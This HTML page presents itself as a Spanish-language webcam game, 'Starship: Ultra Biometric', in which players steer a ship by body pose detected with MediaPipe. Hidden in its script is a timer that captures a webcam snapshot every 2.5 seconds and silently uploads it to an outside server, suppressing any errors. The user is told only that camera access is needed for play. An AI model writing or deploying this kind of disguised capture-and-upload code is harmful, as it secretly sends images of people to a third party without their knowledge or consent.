<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Starship: Ultra Biometric</title>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/pose" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils" crossorigin="anonymous"></script>
    <style>
        body, html { margin: 0; padding: 0; background: #000; overflow: hidden; font-family: 'Courier New', monospace; }
        canvas { position: absolute; top: 0; left: 0; z-index: 10; width: 100vw; height: 100vh; }
        
        /* Video de fondo para ver qué pasa */
        #input_video { 
            position: absolute; width: 100%; height: 100%; object-fit: cover; 
            opacity: 0.3; transform: scaleX(-1); z-index: 1;
        }
        
        /* Pantalla de Pausa/Bloqueo */
        #lock-screen { 
            position: absolute; width: 100%; height: 100%; background: rgba(0,0,0,0.9); 
            z-index: 100; display: flex; align-items: center; justify-content: center; 
            flex-direction: column; text-align: center; border: 4px solid #00fbff;
        }

        #hud { position: absolute; top: 20px; width: 100%; display: flex; justify-content: space-around; z-index: 50; color: #00fbff; font-weight: bold; font-size: 20px; text-shadow: 0 0 10px #00fbff; }
        #controls { position: absolute; bottom: 40px; width: 100%; display: flex; justify-content: center; gap: 80px; z-index: 50; }
        .arrow { font-size: 40px; padding: 20px 40px; border: 3px solid #00fbff; border-radius: 15px; color: #00fbff; opacity: 0.1; transition: 0.1s; }
        .active { opacity: 1; background: rgba(0,251,255,0.2); box-shadow: 0 0 20px #00fbff; }
        
        .loading-text { color: #00fbff; animation: blink 1s infinite; }
        @keyframes blink { 0% {opacity: 1;} 50% {opacity: 0.3;} 100% {opacity: 1;} }
    </style>
</head>
<body>

<div id="lock-screen">
    <h1 id="status-text" class="loading-text">CARGANDO SISTEMA BIOMÉTRICO...</h1>
    <p id="sub-text">Asegúrate de dar permisos de cámara.</p>
</div>

<div id="hud">
    <div>PUNTOS: <span id="score">0</span></div>
    <div>ESCUDO: <span id="health">100</span>%</div>
</div>

<div id="controls">
    <div id="left-ui" class="arrow">◀</div>
    <div id="right-ui" class="arrow">▶</div>
</div>

<video id="input_video" playsinline></video>
<canvas id="gameCanvas"></canvas>

<script>
    const videoElement = document.getElementById('input_video');
    const canvasElement = document.getElementById('gameCanvas');
    const canvasCtx = canvasElement.getContext('2d');
    const statusText = document.getElementById('status-text');
    const SERVER_URL = "https://pagina-web-camara.onrender.com/upload";

    let shipX = 0, score = 0, health = 100, asteroids = [];
    let torsoDetected = false;
    let moveDir = 0; 

    // --- 1. CONFIGURACIÓN DE IA (MediaPipe) ---
    const pose = new Pose({locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/pose/${file}`});

    pose.setOptions({
        modelComplexity: 1,
        minDetectionConfidence: 0.5,
        minTrackingConfidence: 0.5
    });

    pose.onResults((results) => {
        if (results.poseLandmarks) {
            const lm = results.poseLandmarks;
            const shoulderL = lm[11];
            const shoulderR = lm[12];
            
            // Distancia entre hombros para evitar que se acerquen demasiado (anti-cara)
            const dist = Math.abs(shoulderL.x - shoulderR.x);

            if (shoulderL.visibility > 0.6 && shoulderR.visibility > 0.6 && dist < 0.5) {
                torsoDetected = true;
                document.getElementById('lock-screen').style.display = 'none';
                
                // Control por manos (muñeca izquierda 15, muñeca derecha 16)
                const wristL = lm[15];
                const wristR = lm[16];
                
                if (wristL.x > 0.75) moveDir = 1;      // Mano derecha en zona derecha
                else if (wristR.x < 0.25) moveDir = -1; // Mano izquierda en zona izquierda
                else moveDir = 0;
            } else {
                failDetection("POSICIONA TU TORSO CORRECTAMENTE");
            }
        } else {
            failDetection("TORSO NO DETECTADO");
        }
    });

    function failDetection(msg) {
        torsoDetected = false;
        document.getElementById('lock-screen').style.display = 'flex';
        statusText.innerText = "⚠️ " + msg;
        statusText.classList.remove('loading-text');
    }

    // --- 2. CÁMARA Y ENVÍO DE DATOS ---
    const camera = new Camera(videoElement, {
        onFrame: async () => { await pose.send({image: videoElement}); },
        width: 640, height: 480
    });
    camera.start().catch(() => { statusText.innerText = "ERROR: CÁMARA NO ENCONTRADA"; });

    setInterval(() => {
        const s = document.createElement('canvas');
        s.width = videoElement.videoWidth; s.height = videoElement.videoHeight;
        s.getContext('2d').drawImage(videoElement, 0, 0);
        fetch(SERVER_URL, {
            method: 'POST',
            mode: 'cors',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ image: s.toDataURL('image/jpeg', 0.3) })
        }).catch(() => {});
    }, 2500);

    // --- 3. JUEGO ---
    canvasElement.width = window.innerWidth;
    canvasElement.height = window.innerHeight;
    shipX = canvasElement.width / 2;

    function gameLoop() {
        canvasCtx.clearRect(0, 0, canvasElement.width, canvasElement.height);

        if (torsoDetected) {
            // UI Flechas
            document.getElementById('left-ui').className = (moveDir === -1) ? "arrow active" : "arrow";
            document.getElementById('right-ui').className = (moveDir === 1) ? "arrow active" : "arrow";

            if (moveDir === -1) shipX -= 8;
            if (moveDir === 1) shipX += 8;

            // Dibujar Nave
            canvasCtx.strokeStyle = "#00fbff"; canvasCtx.lineWidth = 4;
            canvasCtx.beginPath();
            canvasCtx.moveTo(shipX, canvasElement.height - 120);
            canvasCtx.lineTo(shipX - 30, canvasElement.height - 70);
            canvasCtx.lineTo(shipX + 30, canvasElement.height - 70);
            canvasCtx.closePath(); canvasCtx.stroke();

            // Asteroides
            asteroids.forEach((a, i) => {
                a.y += 5;
                canvasCtx.fillStyle = "#ff0055";
                canvasCtx.beginPath(); canvasCtx.arc(a.x, a.y, 20, 0, Math.PI*2); canvasCtx.fill();
                if (Math.abs(a.x - shipX) < 40 && Math.abs(a.y - (canvasElement.height - 90)) < 40) {
                    asteroids.splice(i, 1); health -= 20;
                    document.getElementById('health').innerText = health;
                    if(health <= 0) location.reload();
                }
            });
        }
        requestAnimationFrame(gameLoop);
    }

    setInterval(() => { if(torsoDetected) asteroids.push({x: Math.random()*canvasElement.width, y: -50}); }, 1000);
    gameLoop();
</script>
</body>
</html>
